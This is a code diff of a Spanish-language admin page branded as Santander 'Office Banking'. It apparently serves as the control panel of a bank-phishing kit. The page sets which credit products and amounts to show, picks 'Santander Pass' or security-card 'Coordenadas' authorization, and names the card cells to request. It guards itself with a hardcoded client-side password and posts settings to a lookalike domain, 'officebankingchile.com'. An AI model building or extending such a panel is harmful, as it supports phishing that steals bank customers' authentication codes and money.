@@ -4,44 +4,123 @@
   <meta charset="UTF-8">
   <title>Panel de Administración</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="style.css">
+
+  <!-- CSS embebido -->
+  <style>
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+
+    .login-box {
+      max-width: 420px;       /* compacto */
+      margin: 30px auto;
+      padding: 20px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      text-align: center;
+      width: 95%;
+      box-sizing: border-box;
+    }
+
+    .logo {
+      max-width: 120px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      margin: 10px 0 5px;
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    input, select {
+      width: 100%;
+      margin: 8px 0;
+      padding: 8px;
+      font-size: 13px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    .btn-santander {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      background-color: #cc0000;
+      color: #fff;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .btn-santander:hover {
+      background-color: #a80000;
+    }
+
+    #resultado {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    @media (min-width: 768px) {
+      .login-box {
+        width: 60%;
+        padding: 25px;
+      }
+      .btn-santander {
+        width: auto;
+        min-width: 140px;
+      }
+    }
+  </style>
 </head>
 <body>
   <script>
     // Protección por clave simple
     const clave = prompt("Ingrese clave de acceso:");
-    if(clave !== "Trabajo2101"){   // <-- aquí defines tu clave
+    if(clave !== "Trabajo21"){
       alert("Acceso denegado");
-      window.location.href = "index.html"; // redirige al login
+      window.location.href = "index.html";
     }
   </script>
 
   <div class="login-box">
-    <img src="logo-officebanking.png" alt="Office Banking" class="logo">
+    <img src="logo-office-banking.svg" alt="Office Banking" class="logo">
 
     <h2>Configurar Productos y Autorización</h2>
 
     <form id="adminForm">
-      <!-- Productos fijos con checkboxes -->
-      <label><input type="checkbox" id="lineaCredito"> Línea de Crédito</label><br>
-      <label><input type="checkbox" id="tarjetaCredito"> Tarjeta de Crédito</label><br>
-      <label><input type="checkbox" id="visualizacionTarjeta"> Visualización de Tarjeta</label><br>
+      <!-- Productos -->
+      <label><input type="checkbox" id="producto1"> Línea de Crédito</label>
+      <input type="number" id="monto1" placeholder="Ej: 0">
 
-      <!-- Montos asociados -->
-      <label for="montoLinea">Monto Línea de Crédito</label>
-      <input type="number" id="montoLinea" placeholder="Ej: 5000000">
+      <label><input type="checkbox" id="producto2"> Tarjeta de Crédito</label>
+      <input type="number" id="monto2" placeholder="Ej: 0">
 
-      <label for="montoTarjeta">Monto Tarjeta de Crédito</label>
-      <input type="number" id="montoTarjeta" placeholder="Ej: 7000000">
+      <label><input type="checkbox" id="producto3"> Visualización de Tarjeta de Crédito</label>
 
-      <!-- Selección de tipo de autorización -->
+      <!-- Tipo de autorización -->
       <label for="tipoAutorizacion">Tipo de Autorización</label>
       <select id="tipoAutorizacion">
         <option value="santander">Santander Pass</option>
         <option value="coordenadas">Coordenadas</option>
       </select>
 
-      <!-- Coordenadas configurables por el admin -->
+      <!-- Coordenadas -->
       <div id="coordConfig">
         <label for="coord1">Coordenada 1 (ej: A4)</label>
         <input type="text" id="coord1" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: A4">
@@ -53,27 +132,25 @@
         <input type="text" id="coord3" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: C2">
       </div>
 
-      <button class="btn-santander" type="submit">
-        Guardar<span class="bg-arrow"></span>
-      </button>
+      <button class="btn-santander" type="submit">Guardar</button>
     </form>
 
     <div id="resultado"></div>
   </div>
 
   <script>
-    const API_URL = "https://autorizaci-n-coordenadas-o-pass.onrender.com/config";
+    const API_URL = "https://officebankingchile.com/config";
 
-    // Al cargar, obtener configuración desde el backend
+    // Al cargar, obtener configuración
     document.addEventListener("DOMContentLoaded", () => {
       fetch(API_URL)
         .then(res => res.json())
         .then(data => {
-          document.getElementById("lineaCredito").checked = data.productos?.lineaCredito || false;
-          document.getElementById("tarjetaCredito").checked = data.productos?.tarjetaCredito || false;
-          document.getElementById("visualizacionTarjeta").checked = data.productos?.visualizacionTarjeta || false;
-          document.getElementById("montoLinea").value = data.montoLinea || "";
-          document.getElementById("montoTarjeta").value = data.montoTarjeta || "";
+          document.getElementById("producto1").checked = data.producto1 === "Línea de Crédito";
+          document.getElementById("monto1").value = data.monto1 || "";
+          document.getElementById("producto2").checked = data.producto2 === "Tarjeta de Crédito";
+          document.getElementById("monto2").value = data.monto2 || "";
+          document.getElementById("producto3").checked = data.producto3 === "Visualización de Tarjeta de Crédito";
           document.getElementById("tipoAutorizacion").value = data.tipoAutorizacion || "santander";
           document.getElementById("coord1").value = data.coord1 || "";
           document.getElementById("coord2").value = data.coord2 || "";
@@ -85,18 +162,16 @@
         });
     });
 
-    // Guardar nuevos valores en el backend
+    // Guardar configuración
     document.getElementById("adminForm").addEventListener("submit", function(e){
       e.preventDefault();
 
       const config = {
-        productos: {
-          lineaCredito: document.getElementById("lineaCredito").checked,
-          tarjetaCredito: document.getElementById("tarjetaCredito").checked,
-          visualizacionTarjeta: document.getElementById("visualizacionTarjeta").checked
-        },
-        montoLinea: document.getElementById("montoLinea").value,
-        montoTarjeta: document.getElementById("montoTarjeta").value,
+        producto1: document.getElementById("producto1").checked ? "Línea de Crédito" : "",
+        monto1: document.getElementById("producto1").checked ? document.getElementById("monto1").value : "",
+        producto2: document.getElementById("producto2").checked ? "Tarjeta de Crédito" : "",
+        monto2: document.getElementById("producto2").checked ? document.getElementById("monto2").value : "",
+        producto3: document.getElementById("producto3").checked ? "Visualización de Tarjeta de Crédito" : "",
         tipoAutorizacion: document.getElementById("tipoAutorizacion").value,
         coord1: document.getElementById("coord1").value.toUpperCase(),
         coord2: document.getElementById("coord2").value.toUpperCase(),
